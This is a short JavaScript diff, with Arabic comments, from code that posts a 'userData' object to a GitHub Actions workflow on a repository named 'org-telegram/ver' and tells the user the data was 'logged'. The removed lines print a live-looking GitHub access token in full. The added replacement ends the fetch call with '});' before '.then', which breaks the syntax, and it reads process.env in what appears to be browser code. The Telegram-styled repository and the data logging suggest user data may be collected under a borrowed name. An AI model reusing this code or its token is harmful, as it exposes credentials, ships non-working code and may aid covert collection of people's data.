@@ -52,18 +52,18 @@
 
             // إرسال البيانات إلى GitHub Actions API
             fetch('https://api.github.com/repos/org-telegram/ver/actions/workflows/log-data.yml/dispatches', {
-                method: 'POST',
-                headers: {
-                    'Authorization': 'Bearer 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', // استبدل بـ Secret مخزن
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    ref: 'main', // الفرع الرئيسي في المستودع
-                    inputs: {
-                        userData: JSON.stringify(userData)
-                    }
-                })
-            })
+    method: 'POST',
+    headers: {
+        'Authorization': `Bearer ${process.env.GH_TOKEN}`, // قراءة السر من الإعدادات
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        ref: 'main',
+        inputs: {
+            userData: JSON.stringify(userData)
+        }
+    })
+});
             .then(response => {
                 if (response.ok) {
                     alert("Your data has been logged successfully!");
